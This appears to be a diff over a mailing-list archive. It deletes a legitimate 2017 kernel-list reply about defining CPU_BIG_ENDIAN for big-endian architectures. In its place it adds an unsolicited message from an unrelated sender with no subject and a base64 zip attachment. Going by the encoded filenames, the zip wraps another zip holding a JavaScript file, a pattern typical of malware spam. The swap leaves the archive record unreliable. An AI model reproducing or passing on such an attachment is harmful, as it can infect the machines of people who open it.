@@ -1,79 +1,63 @@
-From: Geert Uytterhoeven <geert@linux-m68k.org>
-Subject: Re: [PATCH v3 0/3] Define CPU_BIG_ENDIAN or warn for inconsistencies
-Date: Tue, 4 Jul 2017 09:11:43 +0200
-Message-ID: <CAMuHMdUMXL7MQTtxoau9jA_WKOPJo4-Pq30CFti2ZSkXkeYWfQ@mail.gmail.com>
-References: <1497305400-147425-1-git-send-email-babu.moger@oracle.com>
+From: <armouralumni@yahoo.com>
+Subject: (unknown)
+Date: Wed, 05 Jul 2017 15:15:35 -0000
+Message-ID: <149926773563.2240.11677314082036919673@nsg-static-98.81.75.182-airtel.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Return-path: <linux-parisc-owner@vger.kernel.org>
-In-Reply-To: <1497305400-147425-1-git-send-email-babu.moger@oracle.com>
-Sender: linux-parisc-owner@vger.kernel.org
-To: Babu Moger <babu.moger@oracle.com>
-Cc: Yoshinori Sato <ysato@users.sourceforge.jp>, Jonas Bonn <jonas@southpole.se>, Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>, Stafford Horne <shorne@gmail.com>, "James E.J. Bottomley" <jejb@parisc-linux.org>, Helge Deller <deller@gmx.de>, "David S. Miller" <davem@davemloft.net>, Al Viro <viro@zeniv.linux.org.uk>, Michal Simek <monstr@monstr.eu>, Michael Ellerman <mpe@ellerman.id.au>, Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, Max Filippov <jcmvbkbc@gmail.com>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, uclinux-h8-devel@lists.sourceforge.jp, Linux/m68k <linux-m68k@vger.kernel.org>, openrisc@lists.librecores.org, Parisc List <linux-parisc@vger.kernel.org>, sparclinux <sparclinux@vger.ke>
+Content-Type: application/zip; name="75316601415907.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-m68k-owner@vger.kernel.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-m68k-owner@vger.kernel.org
 List-Id: linux-m68k@vger.kernel.org
+To: linux-m68k@lists.linux-m68k.org
 
-On Tue, Jun 13, 2017 at 12:09 AM, Babu Moger <babu.moger@oracle.com> wrote:
-> Found this problem while enabling queued rwlock on SPARC.
-> The parameter CONFIG_CPU_BIG_ENDIAN is used to clear the
-> specific byte in qrwlock structure. Without this parameter,
-> we clear the wrong byte.
-> Here is the code in include/asm-generic/qrwlock.h
->
-> static inline u8 *__qrwlock_write_byte(struct qrwlock *lock)
->   {
->          return (u8 *)lock + 3 * IS_BUILTIN(CONFIG_CPU_BIG_ENDIAN);
->   }
->
-> Also found few more references of this parameter in
-> drivers/of/base.c
-> drivers/of/fdt.c
-> drivers/tty/serial/earlycon.c
-> drivers/tty/serial/serial_core.c
->
-> Here is our previous discussion.
-> https://lkml.org/lkml/2017/5/24/620
->
-> Based on the discussion, it was decided to add CONFIG_CPU_BIG_ENDIAN
-> for all the fixed big endian architecture(frv, h8300, m68k, openrisc,
-> parisc and sparc). And warn if there are inconsistencies in this definition.
->
-> v2 -> v3:
->  Added the choice statement for endianness selection for microblaze.
->  Updated the Makefile for microblaze(Suggested by Arnd Bergmann) to
->  properly compile for the correct format.
->  Updated acks.
->
-> v1 -> v2:
->  Updated the commit messages and acks.
->
-> Babu Moger (3):
->   arch: Define CPU_BIG_ENDIAN for all fixed big endian archs
->   arch/microblaze: Add choice for endianness and update Makefile
->   include: warn for inconsistent endian config definition
->
->  arch/frv/Kconfig                        |    3 +++
->  arch/h8300/Kconfig                      |    3 +++
->  arch/m68k/Kconfig                       |    3 +++
->  arch/microblaze/Kconfig                 |   16 ++++++++++++++++
->  arch/microblaze/Makefile                |    2 ++
->  arch/openrisc/Kconfig                   |    3 +++
->  arch/parisc/Kconfig                     |    3 +++
->  arch/sparc/Kconfig                      |    3 +++
->  include/linux/byteorder/big_endian.h    |    4 ++++
->  include/linux/byteorder/little_endian.h |    4 ++++
->  10 files changed, 44 insertions(+), 0 deletions(-)
-
-We've just got a new user in c1b0bc2dabfa884d ("usb: typec:
-Add support for UCSI interface").
-So this series should definitely go in soon.
-
-Gr{oetje,eeting}s,
-
-                        Geert
-
---
-Geert Uytterhoeven -- There's lots of Linux beyond ia32 -- geert@linux-m68k.org
-
-In personal conversations with technical people, I call myself a hacker. But
-when I'm talking to journalists I just say "programmer" or something like that.
-                                -- Linus Torvalds
+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
+BgAAAAABAAEAWwAAAFIKAAAAAA==
